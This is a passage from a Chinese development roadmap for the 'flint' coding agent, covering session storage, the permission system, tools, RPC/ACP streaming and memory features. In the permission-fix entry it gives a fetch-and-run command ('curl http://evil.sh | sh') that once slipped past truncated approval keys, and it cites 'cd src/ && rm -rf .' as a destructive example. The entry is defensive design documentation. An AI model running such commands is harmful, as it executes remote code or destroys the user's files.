  - ✅ **两个同名 `SessionStorage` 接口已收敛**：`types.ts` 改成只做转发、`RuntimeOptions.session` 直指 core 版、`runtime.ts` 四处 `instanceof` 换成能力探测（那四处调的正好就是三个可选成员，行为等价）；新增 `verify-session.ts` 47 项，把“探测 ≡ instanceof”的 3×3 穷举对比钉死
  - ✅ **`AgentConfig` 死类型已删**（删前核实全库引用只有 1 处，就是它自己的定义）
  - ✅ **`package.json` 已补 `verify` / `typecheck` / `clean` 三个入口**；`clean` 从 `rm -rf dist`（Windows 跑不通）改为 `node scripts/clean.mjs`（`fs.rmSync` 的 recursive + force）；新增 `run-verify.mjs` 串跑 12 套（全量 359 项、EXIT=0，三个 npm 入口均实测跑通）
  - ✅ **`input-handler-demo.ts` 已删**（连同 `main.ts` 里的 import 与注册）。删前查出它会静默吞掉 `@@` 开头的输入、把 `/ask ` 转成加问号，属**未文档化的魔法行为却挂在生产路径上**；`runtime.onInput()` 能力本身保留给下面的 Hook 系统
  - ✅ **GLOSSARY 5 处同文件锚点死链修好**（`#项目元数据` ×4、`#event-subscription` ×1，按该文件其余 30+ 处已用的“全 slug 含中文后缀”约定对齐），并把检查固化为 `verify-docs.mjs`；其中“入站锚点契约”6 条把被 DECISION_LOG / GLOSSARY 引用的标题文字钉死（DECISION_LOG 是 append-only，断链没法在源头修，只能不让标题变）
  - ⏸ **压缩用量没回流（`/usage` 少算）本轮不做**：要改就得改 `ChatResult` 的形状，牵连两个 provider 的非流式路径 + `stream-helper` + 多套 verify 脚本，是独立的一件事，已在上面"可观测性增强"的剩余项里（补记 2026-09-12：**已落地**，以"可观测性增强"剩余项处的补记为准）
  - 遗留两项：`src/runtime/commands/` 空目录仍在（git 不跟踪空目录，仓库里本就没它，只是本地残留）；另查出 **`InputHandler` 同名冲突**（`runtime.ts` 的函数类型 vs `io/ui/input-handler.ts` 的类），未改、只在两处各加注释互指，详见 ARCHITECTURE.md 第四节第 8 条
- [x] **历史结构化数据接通** —（2026-09-04 立项；**2026-09-12 按方案 B 落地**）
  - 补记：**方案 B（thinking 开关分叉）**——agent-loop 以 `turnLog` 上交本轮生成的中间消息，runtime 逐条带 extra 落盘；请求侧 thinking 关（或 auto 未激活）→ 历史全量结构化回传（跨轮工具可见），thinking 开 → 降级纯文本（tool 结果转 user 文本、空 assistant 轮剔除），`thinkingBlocks` 仍不落盘，安全阀原样保留当兜底。全保真"方案 A"已于 2026-09-12 晚**关闭**：官方文档证实跨轮思考块**无回传义务**且不计上下文（"the API automatically ignores thinking blocks from previous turns"），协议只硬性要求当前工具循环内的块——而那些块活在单次 `run()` 的内存消息链上从未丢失；落盘是在给 API 不要的东西付工程成本。API 对"历史带 tool_calls 而无块 + thinking 开"的真实处理是**静默关 thinking**（非 400），降级转写让历史兼容、thinking 真开得起来——价值被文档坐实。详见 ARCHITECTURE.md 第二节决策 7 及其补记
  - 原状：`MessageEntry` 的格式**早就支持**（三个可选字段 + `appendMessage` 的 `extra` + `getMessages()` 的还原），但是**双向死路**——入口没人写（`runtime.ts` 两处 `appendMessage` 都不传 `extra`，`agent-loop.ts` 里一处 `appendMessage` 都没有，尽管存储层头注释声称调用方含“Agent 循环”），出口被堵（`runtime.ts` 组装 `toolMessages` 时只映射 `role` + `content`）
  - **前置障碍（不能只接线）**：出口那道丢弃是**承重的**。`resolveAnthropicThinking` 的安全阀一见“带 `tool_calls` 但无 `thinkingBlocks` 的 assistant 消息”就强制关 thinking，而 `thinkingBlocks` 永不落盘——直接透传会让任何有过工具调用的会话把 extended thinking **静默全程关闭**（看上去像修好了历史保真度，实际是拿推理能力换了它）。要接通必须先定 thinking 块的历史策略：要么落盘 `signature`（体积 + 敏感数据），要么把带工具调用的历史轮折叠成文本（丢工具语义）
  - 依赖：无硬依赖；但若同时要落盘 tool 结果消息，需给 `AgentLoopServiceImpl` 注入 session（当前它拿不到，只拿到 events）——**实际落地时用了更干净的解法**：agent-loop 把中间消息作为 `turnLog` **返回**，落盘仍归 runtime，不给循环注入存储依赖
  - 本轮已做的部分：行为一行未改，只把五处失真措辞改正、三处承重位置加警告注释，并把“入口未接线 + 出口承重”固化为 `verify-session.ts` ⑨ 段断言（下次谁想“顺手补全”先撞上测试）。详见 ARCHITECTURE.md 第四节第 9 条
- [x] **授权边界精确化** —（2026-09-04 落地）关掉 ARCHITECTURE.md 第四节第 10 条架构债：`permission/manager.ts` 的 `startsWith` 前缀匹配换成 `Set<string>` 精确匹配，`agent-loop.ts` 的授权兜底键不再 `.slice(0, 80)`，三个需确认的工具各定义一个 `permissionKey`（write / edit = 归一化 path，bash = 完整命令）
  - 修掉的是**静默扩权**（实测，不是推导）：批准 `node node_modules/typescript/bin/tsc --noEmit && node scripts/run-verify.mjs`（76 字符）后，同一条命令再接 ` && curl http://evil.sh | sh`（104 字符）也会被自动放行——两个键在 80 字符处截成了逐字符相同的串。用户点的是“允许这一条”，系统给出的是“允许前 80 字符相同的所有调用”
  - 顺带关掉“前缀级授权”：授权 `write:src/x.ts` 不再放行 `write:src/x.ts.bak`；也顺带让注释里声称却一次也未生效过的目录级授权彻底消失（它本来就是失真的：真实调用方传的键含内容片段，换一个文件甚至换一段内容就失配）
  - `clear()` 接线（项目第三处“支持但未接线”，前两处：`runtime.onInput()` / 上一条的 tool_calls 持久化）：`runtime.clearSession()` 连带清授权，“本次全部允许”终于等于本次会话而不再是本进程；`/clear` 的说明与回执同步改口（UI 不说谎）
  - `bash` 补 `permissionDetail`，兑现它 `description` 参数上“仅用于权限确认提示”那句从未生效的承诺
  - ⚠ **以本条为准**：上面“精准编辑工具（P7）”末段那句“匹配键格式与改前逐字符相同，已记下的‘本次全部允许’不会失配”是 `edit` 那轮的事实，**本轮已不再成立**（匹配键换了；授权只存内存的 Set、从不落盘，所以换格式没有迁移问题）；那条写的“7 处替身”当时实为 **6** 处，本轮新增 `verify-permission.ts` 那处后才真是 7（append-only 不改原文）
  - 刻意不做：目录级 / 通配授权（`bash` 的键是完整命令，`cd src/` 就以 `/` 结尾，按“以 / 结尾就前缀放行”等于批准 `cd src/ && rm -rf .`）；命令级白名单（需命令语义解析）。write / edit 的键不含内容 → “本次全部允许”= 本会话内不再问这个文件，这是**刻意的放宽**，取舍与四条代价见 DECISION_LOG 2026-09-04
  - 验证：新增 `scripts/verify-permission.ts` 62 项（7 段：含“改前的截断键确实把这两条命令判成同一个键”的**对照组**，以及 ⑦ 段造真 `Runtime` 数 `clear()` 被调几次的**行为证明**）；`verify-edit.ts` 的 A5 与头部承重设计③ 跟着改（源码形状变了）；全量 14 套 482 项、tsc --noEmit 均 EXIT=0
  - 对标：Cline 的 per-tool 权限上下文（每种工具自己决定“一次授权覆盖多大范围”），而不是把授权键的形状写死在权限子系统里

### P7 — 业务能力强化（让 Agent 真正解决实际问题）

> 工具/架构已齐，以下为提升 Agent"解决真实编码任务"能力，按见效速度排序。

- [x] **系统提示词强化** —（2026-09-04 核实后关闭）原案：从"别乱调工具"升级为"教 Agent 解决任务的流程"：
  - 拆解问题 → 分步执行 → 验证 → 迭代
  - 如何用工具组合完成多步任务（先理解再动手）
  - 遇到错误如何排查重试（读错误 → 定位 → 修复）
  - 写完代码跑测试验证
  - 理由：同样工具，提示词决定 Agent 是"会说话"还是"会干活"，成本最低见效最快
  - 逐条对账（2026-09-04 核实，证据在 `context/sections/core-section.ts`，44 行五节）：拆解→分步→验证→迭代 ⇒【任务执行流程】1-5 步；工具组合完成多步任务 ⇒【工具增强推理】（不确定就查 ls/read/grep、算不清就跑 bash、基于真实结果推理）+【场景判断】；错误排查重试 ⇒ 流程第 4 步（报错就读错误 → 定位 → 修复 → 重跑）；写完跑测试验证 ⇒【铁律】收尾必验证（禁止口头声称已验证）
  - 超出原案的部分：另有【工作记忆】节（TASK.md 复选框清单 + 检测到未勾选项时追加续传提示），把长任务的断点续传也写进了提示词
  - ⚠ **以已完成任务表末两行为准（2026-09-11）**：上面那句【工作记忆】的写法**已不再成立**。
    C 方案把真相源从文件搬进内存后，`core-section.ts` 教的是 `todo` 工具（`op:"add"` 登记 /
    `op:"start"` 进行中 / `op:"done"` 完成），`TASK.md` 降级为投影 + 启动种子、不再由模型
    `write` 重抄。逐字核对见 `src/context/sections/core-section.ts` 第 22/32-38 行
- [x] **精准编辑工具** —（2026-09-04 落地，实现与原案不同）原案：新增 apply_patch / editor（diff 式精准修改，不整体覆盖文件）。落地的是第 6 个内置工具 `edit`（`tools/builtin.ts`）：`oldText` 必须在文件中**唯一命中**才替换，0 命中与多命中都**拒绝且一字不落盘**，多命中回报候选行号（确认每处都该改时才传 `replaceAll: true`）
  - 为什么不用 diff/patch 格式：apply_patch 要模型输出带行号与上下文的补丁块，格式错一格整块作废；唯一原文片段把“定位对不对”这件事交给文件自己回答，模型只需照抄原文
  - 不用正则：`oldText` 里满是 `. * ( [ ?` 这类元字符，走正则就得转义，漏转一个就把“改这一处”变成“改一片”；改用 `indexOf` + 字面切片拼接
  - 字节级保真：纯 CRLF 文件在 `\n` 归一化副本上匹配、写回前整体还原（Windows 上 `core.autocrlf=true` 检出的源码就是 CRLF，不做这层则跨行 `oldText` 必然 0 命中，工具会在最需要它的地方失效）；BOM 自己按字节判、原样写回（实测 Node v24.12.0 用 utf-8 读**不剥** BOM，但不拿这种行为细节当设计依据）
  - 拒绝路径用 `[ERROR]` 前缀是**承重的**：agent-loop 只把 `[ERROR]`/`[VERIFY_FAILED]` 记作失败，而重复失败保护只在失败时计数——换成 `[NO_MATCH]` 会让模型拿同一个错 `oldText` 空转烧轮次而收不到提醒。已写成承重注释 + 断言
  - 配套改动：`ToolDefinition.permissionDetail?` 与 `ToolProvider.permissionDetail?` 都是**可选成员**（加必需成员会打坏 7 处替身），弹窗显示“改 路径: 旧 → 新”；agent-loop 把原先一个变量兼三职的 `detail` 拆成 `detail`（显示）+ `autoKey`（授权匹配），匹配键格式与改前逐字符相同，已记下的“本次全部允许”不会失配
  - 提示词侧：core-section【铁律】加一条“改一小段用 edit，不要 write 重抄全文”，write 的工具描述也加了流向 edit 的分流指引
  - 验证：新增 `scripts/verify-edit.ts` 41 项（唯一命中 / 两条拒绝路径 / 候选行号 / CRLF / BOM / 混合行尾 / 参数边界 / 弹窗文案单行契约），全量 13 套 420 项
  - 对标：Cline 的 apply_patch / editor（本项目取“唯一原文片段”而非补丁块）
- [x] **测试验证闭环** —（2026-09-04 核实后关闭）提示词 + 工具引导 Agent"改代码 → 跑测试 → 看结果 → 再改"
  - 理由：Agent 能写代码但不会自证正确；真实修 bug/写功能需要验证迭代
  - 闭环的四段各自落在哪（2026-09-04 核实）：改代码 ⇒ `edit` / `write` 工具；跑测试 ⇒ `bash` 工具 +【铁律】收尾必验证（项目没有测试入口时至少做语法/类型检查）；看结果 ⇒【任务执行流程】第 4 步；再改 ⇒ 同一步的“读错误 → 定位 → 修复 → 重跑”，另有重复失败保护兜底（同一调用连续失败 2 次即追加 [系统提示] 叫模型换路子、3 次叫它放弃这条路并向用户说明卡点）
  - 残留（未立项）：闭环全靠提示词约束，没有“改完自动跑测试”的机制（无 watch、无 pre-commit）——模型不调 bash 就没人替它调
- [ ] **实用工具补全** — 列表目录（ls）、网页抓取（fetch）、读取多文件（并行 read）
  - 理由：扩展可处理的任务类型（查项目结构/查网页/批量读）
  - 对标：Cline 的 fetch_web_content / pi 的 ls
  - 进度（2026-09-03）：**ls 已落地**（`tools/builtin.ts`），本条只剩 fetch 与并行 read 两项未做，故仍留 `- [ ]`。2026-09-04 又落地 `edit`（属上面“精准编辑工具”一条，与本条无关），内置工具现为 6 个：ls / read / write / edit / grep / bash。上一轮文档校准查出的“该划掉一半”即指此处
  - 补记（2026-09-04 深夜）：同日查出并修好了已有的 grep / bash 两个缺陷（见上面新增的"工具可靠性修复"一条）。它们不在本条的待办里（本条只管"还缺哪些工具"），但记在这里免得后人以为 6 个工具一直都是好的：grep 落地以来在本项目唯一的开发环境（中文 Windows）上一次也没真正搜到过东西（实测：搜一个确实存在的符号返回 `[NO_MATCH]`）
  - **补记（2026-09-11 核实）**：上句的"6 个"**已过时**——内置工具现为 **7 个**：
    ls / read / write / edit / grep / bash / **todo**（`todo` 属"任务清单 C 方案"，与本条无关，
    但它是"还缺哪些工具"这个问题的现状答案的一部分）。本条仍剩 **fetch 与并行 read** 两项未做，
    故 `- [ ]` 保持不动

### P8 — 协议层与前端解耦（2026-09-11 新增）

> 立项契机：给任务清单做终端面板时，用户问"能不能做成可点击的 UI"。核查后发现——**flint 的地基
> 是对的，缺的只是把事件流转发出去**。这一层的目标不是"做个更好看的终端"，而是让 UI 不再
> 是 core 的天花板。

- [x] **流式 RPC notification + 对齐 ACP**
  - 现状：`src/harness/rpc.ts` **已经是 JSON-RPC 2.0 over stdio**（9 个方法），但非流式——
    chat 一次性返回，请求期间进度完全不可见；`text_delta` 通知的 TODO 从第 12 行挂到现在
  - 为什么现在做：**ACP（Agent Client Protocol）用的传输层与 flint 现有 RPC 完全相同**
    （JSON-RPC over stdio）。它是 Zed 2025-08 发布、JetBrains 2026-01 接手共同主导的开放标准
    （Apache 2.0），被称"agent 界的 LSP"，注册表已 28+ agent 在册（Claude Code / Codex CLI /
    Copilot CLI / Gemini CLI / OpenCode 等），Zed 与 JetBrains 原生支持，Neovim/Emacs 靠插件。
    **唯一大缺口是 VS Code**（微软押 MCP，issue #265496 至今未承诺）
  - 关键判断：**"能点击的 UI" 的最优解不是给 TUI 加鼠标，而是让编辑器替我们做 UI**。
    TUI 目前完全无鼠标支持（`input-handler.ts` 里 mouse / SGR / 1006 零命中），纯键盘 + 裸 TTY；
    在终端里做富交互是逆着媒介走，且 Windows 各终端对鼠标序列支持不一
  - 前置条件：**已具备**——core 从一开始就是 headless，`RuntimeEvent` 是纯数据可序列化，
    UI 只是 `subscribe()` 的一个消费者。这是 flint 现在最值钱的部分，别为加点击把它赔进去
  - 收益：做完之后，"任务面板 / Web 前端 / 编辑器接入"从"每加一个都要动 core"退化成
    **三个互不阻塞的纯前端工作**
  - 代价：流式 notification 需定义事件 → 通知的映射与背压策略；ACP 全量对齐（权限请求、
    文件读写、终端）工作量远大于只做流式，建议**先只做流式、接口留 ACP 形状**
  - 风险：协议一旦对外发布就有兼容负担；建议先以"未文档化的实验开关"跑通再定稿
  - 对标：ACP / LSP 的"协议与实现分离"
  - **补记（2026-09-11 晚，已做）—— 上文的「现状」一句已过时，以本条为准**：
    chat 期间现在会推 `session/update` 通知（无 id），**内核 / UI / 事件总线一行未改**，
    只是在 `rpc.ts` 补上了**第三个订阅者**（前两个是 TreeUI 与 TerminalUI）。
    映射表收在新增的 `src/harness/rpc-events.ts`（纯函数 + 极少量配对状态，不碰 stdout），
    字段名用**逐个核对过规范**的 ACP 真名：`agent_message_chunk` / `agent_thought_chunk` /
    `tool_call` / `tool_call_update` / `notice`。两个当时没料到的发现：
    ① **span 层的 `tool_call_start/end` 全 `src/` 从没被发射过**（只有类型定义），
       而 UI 层的 `tool_execution_start/end` 又没有 id —— ACP 的 `toolCallId` 只能自己发号；
    ② `usage` 该进最终响应（ACP 里用量属"一轮的结果"），但本版 `chat` 的 result 仍是字符串
       （保持与既有客户端兼容），无处安放，故**暂不外发**，留到全量对齐时随
       `result: { stopReason, usage }` 一起改。
    另：本条原列的「背压策略」**未做**（本地管道很少触发，代码里已注明是已知缺口）；
    「未文档化的实验开关」也未做——通知是无条件推的，因目前无真实外部消费者

- [x] **会话分叉 RPC 化**（2026-09-12 落地）
  - 现状：`rpc.ts` 分发表 9 个方法，会话操作只有 list / switch / create / clear——
    TUI `/history` 的"从此继续（fork）"与"带摘要从此继续"在编辑器侧没有对应物
  - 做法：新增 `get_history`（带 `msgId` 的全量历史，定位分叉点）与 `fork_session`
    （`summarize` 开关承载带摘要分叉）两个方法，**复用 Runtime 既有三方法，内核零改动**；
    错误码三分离——坏参/分叉点不存在 → -32602、无 forkTo 能力 → -32001 FORK_UNSUPPORTED；
    分叉即切会话，`sink.setSessionName` 同步（后续通知归属正确）。
    决策细节见 DECISION_LOG 锚点 `log-2026-09-12-fork-rpc-design`，验证 `verify-fork-rpc.ts` 30 项
  - 以本条为准：上文"流式 RPC notification"条目里写的"9 个方法"与"补记（2026-09-11 核实）"
    里的 9 方法清单均为**当时**口径，现为 11 个方法
  - 顺带：`handleRequest` 导出为验证面（分发逻辑是纯函数，行为证明不开子进程）

- [ ] **任务清单变更接入可观测性**
  - 现状：`TaskStore.onChange()` 是**零依赖观察者**（刻意不走事件总线，以免把 `todo/` 拖进
    runtime 依赖圈），因此清单变更**不进 `/traces`**，也拿不到 `at` / `seq` / `turnId` 公共头
  - 理由：这是上一轮"任务清单上屏"**明知的代价**——当时判断可接受，故登记在此而非当作遗漏。
    真需要时不必改观察者，在 `todo` 工具层补发一个便签 span 即可（工具层本就认识 runtime）
  - 优先级：低。等真的有人问"这一步任务卡了多久"再做

### P9 — 记忆与经验沉淀（2026-09-13 新增）

> 立项契机：用户想把"项目约定 / 决策原因 / 踩过的坑"沉淀成跨会话可用的资产。
> 核心取舍：**注入（推）与检索（拉）是两条互补通道**——memory 小而精每次注入，
> 事件库按需检索不常驻；两者都照抄 TaskStore 的 C 方案（内存真相源 + 文件投影/种子）。

- [x] **项目级长期记忆**（2026-09-13 落地）
  - 内容：项目约定、架构决策、踩过的坑、经验——一句话一条（`memory` 工具 op:"add"，重复条目拒绝）
  - 落点：`cwd/.flint/memory.md`（投影 + 启动种子，无"全勾选即删"式清理——记忆不会过期）
  - 注入：system 新增 `memory` 层，位于 skills 与 task 之间（会话内基本不变，保持"越稳定越靠前"的缓存纪律）；有条目才注入、2000 字符截断（与 task 层同口径：注入可截、投影不截）
  - 回看：`/memory` 命令（支持关键词过滤）
  - 验证：`verify-memory.ts` 55 项（render/fromMarkdown 40 组属性测试 + 真 Runtime 行为探针 + 分层顺序源码守护）
- [x] **历史事件库**（2026-09-13 落地）
  - 内容与形状：一条 = 一个有名字的事件（decision / experience / incident 叙事四段；tool_call 由打卡自动捕获），JSONL 追加落盘 `cwd/.flint/events.jsonl`，**只增不改**（修正 = 追加新条目）
  - 工具：`record_event`（写，kind 手写不含 tool_call）/ `search_events`（读，kind/tag/keyword/limit 过滤、最新在前、缺省 10 条——拉通道的节制）
  - 命令：`/events`（终端翻阅，kind=/tag=/q=/limit= 参数；与 search_events 共用 formatEvent 排版）
  - 复用打卡机：main.ts 挂**第三个 SpanCollector**（capacity 0 落盘型，与 trace-log watcher 同用法），tool_call 段配对成功即 `recordToolCall` 落库，`turnId` 关联当时的执行轮次（复盘完整过程回 trace.jsonl 翻）——配对逻辑零重复
  - 与记忆的分工：一次性步骤归 todo；跨会话一句话结论归 memory；带来龙去脉的完整事件归 record_event
  - 验证：`verify-eventlog.ts` 65 项（追加型纪律 / 检索过滤 / 坏行跳过 / 真总线自动捕获行为证明 / 变异四轮精准变红）
  - 补记（2026-09-13 晚）：**两个确定性时刻改为自动补记**（kind=system，不经模型——用户不必记得开口）：① 任务清单"整单全完成归档"那一刻 `recordTaskArchive`（单项完成不记，过程归 tool_call 流水）；② compaction 压缩发生时 `recordCompaction`（被压掉的细节从此只在摘要里，"什么时候压过"本身值得记）。套件增至 71 项（变异两轮精准变红）
- [x] **事件库拆分：流水与叙事分文件**（2026-09-13 深夜落地）
  - 立项契机：用户定位明确——flint 面向**编程 Agent**，要记录每一次项目开发的经历。实测发现 27 秒的任务就产生 24 条 tool_call 流水，长项目会把它值钱的叙事（决策/经验/事故）淹掉
  - 拆法：`events.jsonl` 只留**叙事 + system 关键节点**（人看、检索、分享的都是它）；tool_call 流水独立落 `tool-calls.jsonl`（append-only 同纪律，轮转见下条待办）。条目**不嵌路径**（自包含），所以叙事文件本身可移植——发给别人 = 拷文件，路径只活在各人本机的注册表里
  - 兼容：启动载入按 kind 路由——旧 events.jsonl 里已存在的 tool_call 行进流水索引，不回写、不搬家（append-only 不因重构破例）
  - 检索：`search_events` / `/events` 缺省查叙事库；`kind=tool_call` 时查流水索引（历史流水照旧能查到）
- [x] **跨项目检索：全局注册表 + pull_events（用户许可闸）**（2026-09-13 深夜落地）
  - 立项契机：用户要"在其他会话/项目里拉取别的项目踩过的坑"。项目身份就用 **cwd**（同目录 = 同项目，零管理），不引入显式 ID——ID 谁发号、改名搬家跟不跟、撞号，全是新出错面；要补的只是"跨项目找到它"
  - 注册表：`~/.flint/projects.jsonl`（path / name / firstSeen，启动时自动登记用过 flint 的项目）；**路径做本机身份，文件做可移植载体**——对方拿到叙事文件后放进自己项目的 `.flint/` 即完成导入
  - 工具：`pull_events`（project = 路径或注册表名称，kind/tag/keyword/limit 同 search_events）——**requirePermission: true**，跨项目读档案必须过用户许可闸（提示词教模型：先征得许可再翻别人的项目档案）
  - 已知边界：RPC 非 TTY 模式下权限当前自动放行（既有行为），闸在 TTY 交互里完整生效；如需 RPC 收紧另立条目
- [ ] **流水轮转**（tool-calls.jsonl 防无限增长，优先级低）
  - 设想：超限后按批归档或只留最近 N 条（轮转是唯一合法的 writeFileSync 点，需给 append-only 守护开天窗并注释理由）；叙事库永不轮转
- [ ] **全局级长期记忆**（用户偏好、跨项目习惯，后续跟进）
  - 设想：落点 `~/.flint/memory.md`（GLOBAL_DIR 已存在，`config/manager.ts`）；与项目级同一套 MemoryStore 机制，只是作用域不同——两份文件、两条注入（memory 层里分"项目"与"全局"两段，全局段更稳定放前面）
  - 未做理由：项目级先跑起来，看真实使用频率再决定全局级的条目从哪来（显式工具 or 从项目级升格）
  - 关联决策：DECISION_LOG `log-2026-09-13-memory-eventlog-design`

### P10 — 面向编程 Agent 的项目管理平台化（2026-09-14 立项）

> **立项契机**：用户把 flint 的定位收敛为**专注代码编程项目的智能体平台**，要求对"项目管理"
> 这一块特化与强化。本区块是一份**候选池**（12 组 / 63 条），每条都**逐项对着代码核过缺口**
> ——不把已有能力写成缺口——并标注**复用落点**。
>
> **三条读法**：
> ① `落点` 列里的 **R编号** 指本节末「复用锚点表」中的现成扩展点；标 `新增` 的才是真需要新子系统
>    （63 条里只有 3 条）。② `⚠Cn` 指本节末「冲突与待拍板」——凡牵动既有承重逻辑的都不许静默改。
> ③ **状态列**：`候选` = 尚未立项（待圈选）｜`待办` = 已立项待做｜`已完成`。
>    **圈选 = 把该行状态从 `候选` 改为 `待办`**；未圈选的留在表内不动，不做删除。
> ④ **每处描述都要"一两句话定调"**：本区块每组（以及每条已完成项）先写**一两句话**讲清
>    「这是什么 · 为什么做 · 带来什么价值」，让没读过上下文的人也能一眼看懂，细节再往后展开。
>    只罗列"做了什么"、说不出"改变了什么"的条目，视为没写完。
>
> **现状基线**（2026-09-14 逐项 grep 核实）：内置工具 13 个 · 内置命令 12 个（`builtin/` 注册表
> 实数；另有 `/exit` 在 `harness/repl.ts` 层硬编码、不入目录）· 注入层 6 个
> （core→tools→skills→project→memory→task）。尚无：git 集成 / 项目画像 / 规约文件读取 / 后台任务 /
> 子 Agent / 权限持久化 / 符号级检索 / `@file` 引用。

#### P10 各组定调（一句话：这是什么 · 意义 · 价值）

> 读法 ④ 的落地：不展开细节，每组只用一两句话回答"值不值得做、做了改变什么"。

| 组 | 一句话定调 |
|---|---|
| 10.1 项目识别与画像 | 让 Agent 一进门就知道"这是什么项目"（语言 / 构建 / 测试命令），不再靠 `ls` 现猜——省下每轮开头的试错 |
| 10.2 项目规约遵从 | 把项目自己的规矩（`AGENTS.md` / `CLAUDE.md`）自动送进 Agent 视野——团队约定不必再靠人肉口头传递 |
| 10.3 任务管理强化（**特化核心**） | 现在的清单扁平、无时间无依赖；补上层次 / 依赖 / 时间戳，Agent 才扛得住真实的多步工程 |
| 10.4 计划模式 | 动手前先把方案摆出来给你过目（**先对齐再动手**）——避免大改一通才发现方向错了 |
| 10.5 Git 与变更管理 | **只读侧已落地**（`git` 工具的**八个只读 op**：status / diff / log / branch / show / blame / remote / tag，都结构化返回；bash 里的**裸只读命令**还会被程序**改道**到它），写侧（确认闸 / commit message / 任务 ↔ 提交关联 / 仓库状态注入）仍空白——Agent 才知道自己在哪条分支、改了什么，也让"前后区别"有了事实来源 |
| 10.6 验证闭环与项目命令 | 把"改完自动跑测试"从提示词自觉变成钩子动作——错了当场暴露，不必等你发现 |
| 10.7 代码检索与代码智能 | 从"文本 grep"升到"符号级检索"，并按 `.gitignore` 滤掉噪音——找得准也找得快 |
| 10.8 上下文工程 | `@file` 引用 / 文件固定 / 分层预算——让关键信息不被压缩掉，上下文花在刀刃上 |
| 10.9 权限、沙箱与审计 | 给写操作与工作区边界加确定性护栏并留痕——出了事查得到 |
| 10.10 长任务编排 | 后台任务 / 子 Agent / 并行只读——长任务不再顶死一次对话，也能分工 |
| 10.11 平台化：多项目管理与度量 | 从"一个项目"升到"多个项目的平台"——能切换、能汇总、能看成本 |
| 10.12 项目生命周期协议 | 给项目装上"**档案制度 + 一把锁**"：立项写目标、按坐标分批、每批记前后区别，且目标立项后被程序锁死不许偷改——治的是 **goal drift**；**分层编号**让"一个坐标挂几个子坐标"不必靠嵌套表，**分叉点 `ask`** 让模型遇到技术选型岔路**先停下来问**、而不是自己脑补一个往下冲；**`archive` 工具**把"归档 + 推进状态 + 提议下一坐标"从提示词约定收成**一个动作做完**，**PROJECT.md 快照**每轮注入让模型知道"当前系统长什么样"（快照随代码漂移，自由改、不需许可） |

#### P10.0 复用锚点表（下面所有 `落点` 列的引用对象）

| # | 扩展点 | 位置 | 它能承载什么 |
|---|---|---|---|
| R1 | `defineTool` + `spec.ts` 五构造器 | `tools/builtin.ts` · `tools/spec.ts:101-121` | 一切新工具的入口（`str/strAllowEmpty/optStr/optPosInt/optBool`） |
| R2 | `permissionKey?` / `permissionDetail?` | `ToolDefinition` 可选成员 | 权限弹窗文案与授权粒度（新工具直接声明，不改权限子系统） |
| R3 | `before_tool_call` / `after_tool_call` | `agent-loop.ts`（唯一 execute 点） | 拦截（不可改参、fail-open）：危险命令闸、改完自动验证、契约文件锁、**bash→git 工具路由** |
| R4 | `runtime.onInput()` | `runtime.ts:279`（消费点在 `prompt()` 第 543 行附近） | 输入预处理：**已被 `@file` 引用用上（2026-09-17，10.8.1）**；还能接指令解析——**现成钩子，零新系统**。⚠ 两条纪律：钩子在**命令分发之后**跑（`/cmd` 不会被它改写）；注册处 `main.ts` 走的是 `atFileInputHandler()` 工厂（**唯一实现**，别就地写箭头函数——套件会跑不到真件） |
| R5 | SystemPrompt 分层 + `registerSections` | `context/system-prompt.ts:51-55` · `extensions/sections/` | 新注入段（项目画像/规约/仓库状态）——加一段 = 加一个 `SectionFn` |
| R6 | `TaskStore` + `todo` 工具 + `onChange` + `task-panel.ts` | `todo/store.ts` · `io/ui/task-panel.ts` | 任务管理的一切强化都在它上面长（面板是纯函数） |
| R7 | `MemoryStore`（C 方案：内存真相源 + 投影/种子） | `memory/store.ts` | 同类状态的通用范式：`project.md`、契约、计划、白名单都可照抄 |
| R8 | `EventStore` + 确定性钩子 | `eventlog/store.ts`（`recordTaskArchive` / `recordCompaction` / **`recordAudit`**） | 新增 `recordXxx` 复用 `appendLine` 即可（**审计已用上（10.9.4）**、计划批准、开发归档） |
| R9 | `ProjectRegistry` + `pull_events` 权限闸 | `eventlog/registry.ts` · `tools/builtin.ts` | `/projects` 列表切换、跨项目拉资产 |
| R10 | `CompactionService.compactNow` / `maybeCompact` | `runtime/runtime.ts` | 手动压缩、压缩前快照 |
| R11 | `session-repo`（list/open/create/remove/forkTo） | `core/session-repo.ts` · `session/jsonl-repo.ts` | 项目切换时连带切换/新建会话 |
| R12 | 分层配置 + `GLOBAL_DIR` | `config/manager.ts` | 项目级配置、全局级落盘（`~/.flint/`） |
| R13 | `SpanCollector` / trace / `bumpUsage` | `runtime/span-collector.ts` · `/usage` | 耗时统计、成本度量 |
| R14 | RPC `handleRequest` + `rpc-events.ts` 映射表 | `harness/rpc.ts` | 新能力暴露给编辑器（纯前端零改动） |

#### P10.1 项目识别与画像

| 编号 | 候选项 | 现状 / 缺口 | 建议做法（含落点） | 优先级 | 状态 |
|---|---|---|---|---|---|
| 10.1.1 | 技术栈自动探测 | **已完成（2026-09-17）**。缺口原样：**无任何探测**，模型靠 `ls` + `read` 现猜"这是 TS 还是 Python""该跑 npm 还是 pnpm"。猜错的代价不是报错，而是**看着像项目不通过**——命令不存在只是退出码非 0，**它不知道自己猜错了**（与 10.6.1 想消灭的是同一类误判）。**落地的形状**：新增 `src/project/stack.ts`（**判据纯函数**，只 import `detect.ts`，不碰 fs 不起进程）+ `probe.ts` 的 `probeStack()`（探针，唯一做 IO 的地方），存在性探测 `package.json` / `tsconfig.json` / 五个锁文件 / `pyproject.toml` / `go.mod` / `Cargo.toml` / `pom.xml` / `build.gradle*` → 派生语言与包管理器；`renderStackSection()` 注入 **project 层**（从两半扩成**三半**：现状 → 画像 → 命令表，顺序是承重的）。**判据顺序（承重）**：`packageManager` 字段（**声明**）> 锁文件（**实物证据**）> 默认 `npm`；认不出即丢弃、往下滚。**与 10.6.1 的唯一接头**：`parsePackageScripts(text, manager)` —— `run` 串从写死的 `npm run test` 变成**由画像派生**（`commands.ts` 的注释里早就留了"pnpm/yarn/bun 归 10.1.1 那类画像活儿"这句话，本条去兑现它）；缺省仍是 `npm`，于是**探测不到任何东西的项目行为逐字不回退**。**⚠C9 的答法**（"新增探测要惰性化或挪出启动关键路径"）：探测**不新增任何文件读取**——`package.json` 本来就是启动时读的（给命令表用），这里复用同一份文本，净新增成本只有几次 `existsSync`（且**不含子进程**，不像 `probeProject` 可能起 git）；播种点在 `seedProjectContext()`（启动与切项目**同一处**），运行期不回读。**三条承重**：① **没有 `package.json` 就绝不认 `npm`** —— 一个纯 Rust 项目配着 `npm run` 前缀比不说更糟；② **判不出来就说判不出来**（`manager: null` + `via` 